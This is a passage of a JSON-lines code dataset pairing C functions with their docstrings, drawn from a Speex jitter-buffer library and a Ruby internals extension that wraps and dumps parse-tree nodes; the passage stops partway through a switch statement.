{"docstring": "/** Reset jitter buffer */\n", "func_signal": "EXPORT void jitter_buffer_reset(JitterBuffer *jitter)", "code": "{\n   int i;\n   for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n   {\n      if (jitter->packets[i].data)\n      {\n         if (jitter->destroy)\n            jitter->destroy(jitter->packets[i].data);\n         else\n            speex_free(jitter->packets[i].data);\n         jitter->packets[i].data = NULL;\n      }\n   }\n   /* Timestamp is actually undefined at this point */\n   jitter->pointer_timestamp = 0;\n   jitter->next_stop = 0;\n   jitter->reset_state = 1;\n   jitter->lost_count = 0;\n   jitter->buffered = 0;\n   jitter->auto_tradeoff = 32000;\n   \n   for (i=0;i<MAX_BUFFERS;i++)\n   {\n      tb_init(&jitter->_tb[i]);\n      jitter->timeBuffers[i] = &jitter->_tb[i];\n   }\n   /*fprintf (stderr, \"reset\\n\");*/\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/** Get one packet from the jitter buffer */\n", "func_signal": "EXPORT int jitter_buffer_get(JitterBuffer *jitter, JitterBufferPacket *packet, spx_int32_t desired_span, spx_int32_t *start_offset)", "code": "{\n   int i;\n   unsigned int j;\n   int incomplete = 0;\n   spx_int16_t opt;\n   \n   if (start_offset != NULL)\n      *start_offset = 0;\n\n   /* Syncing on the first call */\n   if (jitter->reset_state)\n   {\n      int found = 0;\n      /* Find the oldest packet */\n      spx_uint32_t oldest=0;\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n      {\n         if (jitter->packets[i].data && (!found || LT32(jitter->packets[i].timestamp,oldest)))\n         {\n            oldest = jitter->packets[i].timestamp;\n            found = 1;\n         }\n      }\n      if (found)\n      {\n         jitter->reset_state=0;         \n         jitter->pointer_timestamp = oldest;\n         jitter->next_stop = oldest;\n      } else {\n         packet->timestamp = 0;\n         packet->span = jitter->interp_requested;\n         return JITTER_BUFFER_MISSING;\n      }\n   }\n   \n\n   jitter->last_returned_timestamp = jitter->pointer_timestamp;\n         \n   if (jitter->interp_requested != 0)\n   {\n      packet->timestamp = jitter->pointer_timestamp;\n      packet->span = jitter->interp_requested;\n      \n      /* Increment the pointer because it got decremented in the delay update */\n      jitter->pointer_timestamp += jitter->interp_requested;\n      packet->len = 0;\n      /*fprintf (stderr, \"Deferred interpolate\\n\");*/\n      \n      jitter->interp_requested = 0;\n      \n      jitter->buffered = packet->span - desired_span;\n\n      return JITTER_BUFFER_INSERTION;\n   }\n   \n   /* Searching for the packet that fits best */\n   \n   /* Search the buffer for a packet with the right timestamp and spanning the whole current chunk */\n   for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n   {\n      if (jitter->packets[i].data && jitter->packets[i].timestamp==jitter->pointer_timestamp && GE32(jitter->packets[i].timestamp+jitter->packets[i].span,jitter->pointer_timestamp+desired_span))\n         break;\n   }\n   \n   /* If no match, try for an \"older\" packet that still spans (fully) the current chunk */\n   if (i==SPEEX_JITTER_MAX_BUFFER_SIZE)\n   {\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n      {\n         if (jitter->packets[i].data && LE32(jitter->packets[i].timestamp, jitter->pointer_timestamp) && GE32(jitter->packets[i].timestamp+jitter->packets[i].span,jitter->pointer_timestamp+desired_span))\n            break;\n      }\n   }\n   \n   /* If still no match, try for an \"older\" packet that spans part of the current chunk */\n   if (i==SPEEX_JITTER_MAX_BUFFER_SIZE)\n   {\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n      {\n         if (jitter->packets[i].data && LE32(jitter->packets[i].timestamp, jitter->pointer_timestamp) && GT32(jitter->packets[i].timestamp+jitter->packets[i].span,jitter->pointer_timestamp))\n            break;\n      }\n   }\n   \n   /* If still no match, try for earliest packet possible */\n   if (i==SPEEX_JITTER_MAX_BUFFER_SIZE)\n   {\n      int found = 0;\n      spx_uint32_t best_time=0;\n      int best_span=0;\n      int besti=0;\n      for (i=0;i<SPEEX_JITTER_MAX_BUFFER_SIZE;i++)\n      {\n         /* check if packet starts within current chunk */\n         if (jitter->packets[i].data && LT32(jitter->packets[i].timestamp,jitter->pointer_timestamp+desired_span) && GE32(jitter->packets[i].timestamp,jitter->pointer_timestamp))\n         {\n            if (!found || LT32(jitter->packets[i].timestamp,best_time) || (jitter->packets[i].timestamp==best_time && GT32(jitter->packets[i].span,best_span)))\n            {\n               best_time = jitter->packets[i].timestamp;\n               best_span = jitter->packets[i].span;\n               besti = i;\n               found = 1;\n            }\n         }\n      }\n      if (found)\n      {\n         i=besti;\n         incomplete = 1;\n         /*fprintf (stderr, \"incomplete: %d %d %d %d\\n\", jitter->packets[i].timestamp, jitter->pointer_timestamp, chunk_size, jitter->packets[i].span);*/\n      }\n   }\n\n   /* If we find something */\n   if (i!=SPEEX_JITTER_MAX_BUFFER_SIZE)\n   {\n      spx_int32_t offset;\n      \n      /* We (obviously) haven't lost this packet */\n      jitter->lost_count = 0;\n      \n      /* In this case, 0 isn't as a valid timestamp */\n      if (jitter->arrival[i] != 0)\n      {\n         update_timings(jitter, ((spx_int32_t)jitter->packets[i].timestamp) - ((spx_int32_t)jitter->arrival[i]) - jitter->buffer_margin);\n      }\n      \n      \n      /* Copy packet */\n      if (jitter->destroy)\n      {\n         packet->data = jitter->packets[i].data;\n         packet->len = jitter->packets[i].len;\n      } else {\n         if (jitter->packets[i].len > packet->len)\n         {\n            speex_warning_int(\"jitter_buffer_get(): packet too large to fit. Size is\", jitter->packets[i].len);\n         } else {\n            packet->len = jitter->packets[i].len;\n         }\n         for (j=0;j<packet->len;j++)\n            packet->data[j] = jitter->packets[i].data[j];\n         /* Remove packet */\n         speex_free(jitter->packets[i].data);\n      }\n      jitter->packets[i].data = NULL;\n      /* Set timestamp and span (if requested) */\n      offset = (spx_int32_t)jitter->packets[i].timestamp-(spx_int32_t)jitter->pointer_timestamp;\n      if (start_offset != NULL)\n         *start_offset = offset;\n      else if (offset != 0)\n         speex_warning_int(\"jitter_buffer_get() discarding non-zero start_offset\", offset);\n      \n      packet->timestamp = jitter->packets[i].timestamp;\n      jitter->last_returned_timestamp = packet->timestamp;\n      \n      packet->span = jitter->packets[i].span;\n      packet->sequence = jitter->packets[i].sequence;\n      packet->user_data = jitter->packets[i].user_data;\n      /* Point to the end of the current packet */\n      jitter->pointer_timestamp = jitter->packets[i].timestamp+jitter->packets[i].span;\n\n      jitter->buffered = packet->span - desired_span;\n      \n      if (start_offset != NULL)\n         jitter->buffered += *start_offset;\n      \n      return JITTER_BUFFER_OK;\n   }\n   \n   \n   /* If we haven't found anything worth returning */\n   \n   /*fprintf (stderr, \"not found\\n\");*/\n   jitter->lost_count++;\n   /*fprintf (stderr, \"m\");*/\n   /*fprintf (stderr, \"lost_count = %d\\n\", jitter->lost_count);*/\n   \n   opt = compute_opt_delay(jitter);\n   \n   /* Should we force an increase in the buffer or just do normal interpolation? */   \n   if (opt < 0)\n   {\n      /* Need to increase buffering */\n      \n      /* Shift histogram to compensate */\n      shift_timings(jitter, -opt);\n      \n      packet->timestamp = jitter->pointer_timestamp;\n      packet->span = -opt;\n      /* Don't move the pointer_timestamp forward */\n      packet->len = 0;\n      \n      jitter->buffered = packet->span - desired_span;\n      return JITTER_BUFFER_INSERTION;\n      /*jitter->pointer_timestamp -= jitter->delay_step;*/\n      /*fprintf (stderr, \"Forced to interpolate\\n\");*/\n   } else {\n      /* Normal packet loss */\n      packet->timestamp = jitter->pointer_timestamp;\n      \n      desired_span = ROUND_DOWN(desired_span, jitter->concealment_size);\n      packet->span = desired_span;\n      jitter->pointer_timestamp += desired_span;\n      packet->len = 0;\n      \n      jitter->buffered = packet->span - desired_span;\n      return JITTER_BUFFER_MISSING;\n      /*fprintf (stderr, \"Normal loss\\n\");*/\n   }\n\n\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/* Let the jitter buffer know it's the right time to adjust the buffering delay to the network conditions */\n", "func_signal": "EXPORT int jitter_buffer_update_delay(JitterBuffer *jitter, JitterBufferPacket *packet, spx_int32_t *start_offset)", "code": "{\n   /* If the programmer calls jitter_buffer_update_delay() directly, \n      automatically disable auto-adjustment */\n   jitter->auto_adjust = 0;\n\n   return _jitter_buffer_update_delay(jitter, packet, start_offset);\n}", "path": "speexjni\\jni\\libspeex\\jitter.c", "repo_name": "yayanyang/speex-android", "stars": 58, "license": "None", "language": "c", "size": 535}
{"docstring": "/*\n * Return the Node's _rest_ member.  The return type is an\n * Integer.\n */\n", "func_signal": "static VALUE node_rest(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n  return LONG2NUM(n->nd_rest);\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _resq_ member.  The return type is\n * either a Node or an Object.\n */\n", "func_signal": "static VALUE node_resq(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n\n  if(TYPE(n->nd_resq) == T_NODE)\n  {\n    if(0 && nd_type(n) == NODE_OP_ASGN2)\n    {\n      return wrap_node_as(\n        (NODE *)n->nd_resq,\n        rb_cNodeSubclass[NODE_OP_ASGN2_ARG]);\n    }\n    else\n    {\n      return wrap_node((NODE *)n->nd_resq);\n    }\n  }\n  else\n  {\n    return (VALUE)n->nd_resq;\n  }\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _cflag_ member.  The return type is an\n * Integer.\n */\n", "func_signal": "static VALUE node_cflag(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n  return LONG2NUM(n->nd_cflag);\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _head_ member.  The return type is\n * either a Node or an Object.\n */\n", "func_signal": "static VALUE node_head(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n\n  if(TYPE(n->nd_head) == T_NODE)\n  {\n    if(0 && nd_type(n) == NODE_OP_ASGN2)\n    {\n      return wrap_node_as(\n        (NODE *)n->nd_head,\n        rb_cNodeSubclass[NODE_OP_ASGN2_ARG]);\n    }\n    else\n    {\n      return wrap_node((NODE *)n->nd_head);\n    }\n  }\n  else\n  {\n    return (VALUE)n->nd_head;\n  }\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _cond_ member.  The return type is\n * either a Node or an Object.\n */\n", "func_signal": "static VALUE node_cond(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n\n  if(TYPE(n->nd_cond) == T_NODE)\n  {\n    if(0 && nd_type(n) == NODE_OP_ASGN2)\n    {\n      return wrap_node_as(\n        (NODE *)n->nd_cond,\n        rb_cNodeSubclass[NODE_OP_ASGN2_ARG]);\n    }\n    else\n    {\n      return wrap_node((NODE *)n->nd_cond);\n    }\n  }\n  else\n  {\n    return (VALUE)n->nd_cond;\n  }\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _var_ member.  The return type is\n * either a Node or an Object.\n */\n", "func_signal": "static VALUE node_var(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n\n  if(TYPE(n->nd_var) == T_NODE)\n  {\n    if(0 && nd_type(n) == NODE_OP_ASGN2)\n    {\n      return wrap_node_as(\n        (NODE *)n->nd_var,\n        rb_cNodeSubclass[NODE_OP_ASGN2_ARG]);\n    }\n    else\n    {\n      return wrap_node((NODE *)n->nd_var);\n    }\n  }\n  else\n  {\n    return (VALUE)n->nd_var;\n  }\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * call-seq:\n *   control_frame.method_id => Symbol or nil\n *\n * Return the frame's method_id member.\n */\n", "func_signal": "static VALUE control_frame_method_id(VALUE control_frame)", "code": "{\n  ID method_id;\n  struct RubyInternalControlFrame * cfp;\n\n  Data_Get_Struct(control_frame, struct RubyInternalControlFrame, cfp);\n\n#if RUBY_VERSION_CODE >= 192\n  method_id = cfp->control_frame->me->called_id; /* TODO: right? */\n#else\n  method_id = cfp->control_frame->method_id;\n#endif\n\n  if(method_id)\n  {\n    return ID2SYM(method_id);\n  }\n  else\n  {\n    return Qnil;\n  }\n}", "path": "ext\\internal\\vm\\control_frame\\control_frame.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _tval_ member.  The return type is\n * either a Node or an Object.\n */\n", "func_signal": "static VALUE node_tval(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n\n  if(TYPE(n->nd_tval) == T_NODE)\n  {\n    if(0 && nd_type(n) == NODE_OP_ASGN2)\n    {\n      return wrap_node_as(\n        (NODE *)n->nd_tval,\n        rb_cNodeSubclass[NODE_OP_ASGN2_ARG]);\n    }\n    else\n    {\n      return wrap_node((NODE *)n->nd_tval);\n    }\n  }\n  else\n  {\n    return (VALUE)n->nd_tval;\n  }\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _opt_ member.  The return type is\n * either a Node or an Object.\n */\n", "func_signal": "static VALUE node_opt(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n\n  if(TYPE(n->nd_opt) == T_NODE)\n  {\n    if(0 && nd_type(n) == NODE_OP_ASGN2)\n    {\n      return wrap_node_as(\n        (NODE *)n->nd_opt,\n        rb_cNodeSubclass[NODE_OP_ASGN2_ARG]);\n    }\n    else\n    {\n      return wrap_node((NODE *)n->nd_opt);\n    }\n  }\n  else\n  {\n    return (VALUE)n->nd_opt;\n  }\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/*\n * Return the Node's _vid_ member.  The return type is a\n * Symbol.\n */\n", "func_signal": "static VALUE node_vid(VALUE self)", "code": "{\n  NODE * n;\n  Data_Get_Struct(self, NODE, n);\n  if(n->nd_vid == 0)\n  {\n    return Qfalse;\n  }\n  else if(n->nd_vid == 1)\n  {\n    return Qtrue;\n  }\n  else\n  {\n    return ID2SYM(n->nd_vid);\n  }\n}", "path": "ext\\cached\\ruby-1.8.4\\internal\\node\\nodeinfo.c", "repo_name": "cout/ruby-internal", "stars": 57, "license": "other", "language": "c", "size": 1319}
{"docstring": "/* Every node contains three elements.  This function takes any one of\n * those elements, converts it to a Ruby object that can be dumped\n * (since nodes can't be dumped), and puts the resulting object into\n * node_hash.\n */\n", "func_signal": "VALUE dump_node_elem(enum Node_Elem_Name nen, NODE * n, VALUE node_hash)", "code": "{\n  switch(nen)\n  {\n    case NEN_NONE:\n      return Qnil;\n    case NEN_1ST:\n      if(n->nd_1st)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_1st);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_1st,\n          node_type,\n          node_hash);\n        return node_id(n->nd_1st);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_2ND:\n      if(n->nd_2nd)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_2nd);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_2nd,\n          node_type,\n          node_hash);\n        return node_id(n->nd_2nd);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_AID:\n      if(n->nd_aid == 0)\n      {\n        return Qfalse;\n      }\n      else if(n->nd_aid == 1)\n      {\n        return Qtrue;\n      }\n      else\n      {\n        return ID2SYM(n->nd_aid);\n      }\n    case NEN_ALEN:\n      {\n      return LONG2NUM((long)n->nd_alen);\n      }\n    case NEN_ARGC:\n      {\n      return LONG2NUM((long)n->nd_argc);\n      }\n    case NEN_ARGS:\n      if(n->nd_args)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_args);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_args,\n          node_type,\n          node_hash);\n        return node_id(n->nd_args);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_BEG:\n      if(n->nd_beg)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_beg);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_beg,\n          node_type,\n          node_hash);\n        return node_id(n->nd_beg);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_BODY:\n      if(n->nd_body)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_body);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_body,\n          node_type,\n          node_hash);\n        return node_id(n->nd_body);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_CFLAG:\n      {\n      return LONG2NUM((long)n->nd_cflag);\n      }\n    case NEN_CFNC:\n      /* rb_funcall(rb_cObject, rb_intern(\"pp\"), wrap_node(n), 0); */\n      rb_raise(rb_eArgError, \"Cannot dump cfunc\");\n    case NEN_CLSS:\n      switch(TYPE(n->nd_clss))\n      {\n        case T_CLASS:\n        case T_MODULE:\n        {\n          /* When dumping a class, we dump just the name (otherwise we'd\n           * get multiple copies of the class each time we load a method\n           * on the other side).\n           */\n          VALUE klass = (VALUE)n->nd_clss;\n          VALUE path;\n          if(FL_TEST(klass, FL_SINGLETON))\n          {\n            VALUE singleton = rb_iv_get(klass, \"__attached__\");\n            path = rb_class_path(singleton);\n          }\n          else\n          {\n            path = rb_class_path(klass);\n            if(StringValuePtr(path)[0] == '#')\n            {\n              rb_raise(rb_eArgError, \"cannot dump anonymous class\");\n            }\n          }\n          return rb_assoc_new(\n              INT2NUM(((struct RBasic *)(n->nd_clss))->flags),\n              path);\n        }\n\n        case T_NODE:\n          rb_raise(\n              rb_eRuntimeError,\n              \"Wrong node elem clss for node type %d\",\n              nd_type(n));\n        \n        default:\n          /* TODO: would like to dump flags, not type */\n          return rb_assoc_new(\n              INT2NUM(TYPE((VALUE)n->nd_clss)),\n              (VALUE)n->nd_clss);\n      }\n    case NEN_CNT:\n      {\n      return LONG2NUM((long)n->nd_cnt);\n      }\n    case NEN_COND:\n      if(n->nd_cond)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_cond);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_cond,\n          node_type,\n          node_hash);\n        return node_id(n->nd_cond);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_CPATH:\n      if(n->nd_cpath)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_cpath);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_cpath,\n          node_type,\n          node_hash);\n        return node_id(n->nd_cpath);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_CVAL:\n      switch(TYPE(n->nd_cval))\n      {\n        case T_CLASS:\n        case T_MODULE:\n        {\n          /* When dumping a class, we dump just the name (otherwise we'd\n           * get multiple copies of the class each time we load a method\n           * on the other side).\n           */\n          VALUE klass = (VALUE)n->nd_cval;\n          VALUE path;\n          if(FL_TEST(klass, FL_SINGLETON))\n          {\n            VALUE singleton = rb_iv_get(klass, \"__attached__\");\n            path = rb_class_path(singleton);\n          }\n          else\n          {\n            path = rb_class_path(klass);\n            if(StringValuePtr(path)[0] == '#')\n            {\n              rb_raise(rb_eArgError, \"cannot dump anonymous class\");\n            }\n          }\n          return rb_assoc_new(\n              INT2NUM(((struct RBasic *)(n->nd_cval))->flags),\n              path);\n        }\n\n        case T_NODE:\n          rb_raise(\n              rb_eRuntimeError,\n              \"Wrong node elem cval for node type %d\",\n              nd_type(n));\n        \n        default:\n          /* TODO: would like to dump flags, not type */\n          return rb_assoc_new(\n              INT2NUM(TYPE((VALUE)n->nd_cval)),\n              (VALUE)n->nd_cval);\n      }\n    case NEN_DEFN:\n      if(n->nd_defn)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_defn);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_defn,\n          node_type,\n          node_hash);\n        return node_id(n->nd_defn);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_ELSE:\n      if(n->nd_else)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_else);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_else,\n          node_type,\n          node_hash);\n        return node_id(n->nd_else);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_END:\n      if(n->nd_end)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_end);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_end,\n          node_type,\n          node_hash);\n        return node_id(n->nd_end);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_ENSR:\n      if(n->nd_ensr)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_ensr);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_ensr,\n          node_type,\n          node_hash);\n        return node_id(n->nd_ensr);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_ENTRY:\n      if(n->nd_entry->id == 0)\n      {\n        return Qfalse;\n      }\n      else\n      {\n        return ID2SYM(n->nd_entry->id);\n      }\n    case NEN_FRML:\n      if(n->nd_frml)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_frml);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_frml,\n          node_type,\n          node_hash);\n        return node_id(n->nd_frml);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_HEAD:\n      if(n->nd_head)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_head);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_head,\n          node_type,\n          node_hash);\n        return node_id(n->nd_head);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_IBDY:\n      if(n->nd_ibdy)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_ibdy);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_ibdy,\n          node_type,\n          node_hash);\n        return node_id(n->nd_ibdy);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_ITER:\n      if(n->nd_iter)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_iter);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_iter,\n          node_type,\n          node_hash);\n        return node_id(n->nd_iter);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_LIT:\n      switch(TYPE(n->nd_lit))\n      {\n        case T_CLASS:\n        case T_MODULE:\n        {\n          /* When dumping a class, we dump just the name (otherwise we'd\n           * get multiple copies of the class each time we load a method\n           * on the other side).\n           */\n          VALUE klass = (VALUE)n->nd_lit;\n          VALUE path;\n          if(FL_TEST(klass, FL_SINGLETON))\n          {\n            VALUE singleton = rb_iv_get(klass, \"__attached__\");\n            path = rb_class_path(singleton);\n          }\n          else\n          {\n            path = rb_class_path(klass);\n            if(StringValuePtr(path)[0] == '#')\n            {\n              rb_raise(rb_eArgError, \"cannot dump anonymous class\");\n            }\n          }\n          return rb_assoc_new(\n              INT2NUM(((struct RBasic *)(n->nd_lit))->flags),\n              path);\n        }\n\n        case T_NODE:\n          rb_raise(\n              rb_eRuntimeError,\n              \"Wrong node elem lit for node type %d\",\n              nd_type(n));\n        \n        default:\n          /* TODO: would like to dump flags, not type */\n          return rb_assoc_new(\n              INT2NUM(TYPE((VALUE)n->nd_lit)),\n              (VALUE)n->nd_lit);\n      }\n    case NEN_MID:\n      if(n->nd_mid == 0)\n      {\n        return Qfalse;\n      }\n      else if(n->nd_mid == 1)\n      {\n        return Qtrue;\n      }\n      else\n      {\n        return ID2SYM(n->nd_mid);\n      }\n    case NEN_MODL:\n      if(n->nd_modl == 0)\n      {\n        return Qfalse;\n      }\n      else if(n->nd_modl == 1)\n      {\n        return Qtrue;\n      }\n      else\n      {\n        return ID2SYM(n->nd_modl);\n      }\n    case NEN_NEW:\n      if(n->nd_new == 0)\n      {\n        return Qfalse;\n      }\n      else if(n->nd_new == 1)\n      {\n        return Qtrue;\n      }\n      else\n      {\n        return ID2SYM(n->nd_new);\n      }\n    case NEN_NEXT:\n      if(n->nd_next)\n      {\n        int node_type;\n        if(1 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_next);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_next,\n          node_type,\n          node_hash);\n        return node_id(n->nd_next);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case NEN_NOEX:\n      {\n      return LONG2NUM((long)n->nd_noex);\n      }\n    case NEN_NTH:\n      {\n      return LONG2NUM((long)n->nd_nth);\n      }\n    case NEN_OLD:\n      if(n->nd_old == 0)\n      {\n        return Qfalse;\n      }\n      else if(n->nd_old == 1)\n      {\n        return Qtrue;\n      }\n      else\n      {\n        return ID2SYM(n->nd_old);\n      }\n    case NEN_OPT:\n      if(n->nd_opt)\n      {\n        int node_type;\n        if(0 && nd_type(n) == NODE_OP_ASGN2)\n        {\n          /* All children of NODE_OP_ASGN2 are NODE_OP_ASGN2_ARG */\n          node_type = NODE_OP_ASGN2_ARG;\n        }\n        else\n        {\n          node_type = nd_type(n->nd_opt);\n        }\n\n        dump_node_or_iseq_to_hash(\n          (VALUE)n->nd_opt,\n          node_type,\n          node_hash);\n        return node_id(n->nd_opt);\n      }\n      else\n      {\n        return Qnil;\n      }\n    case 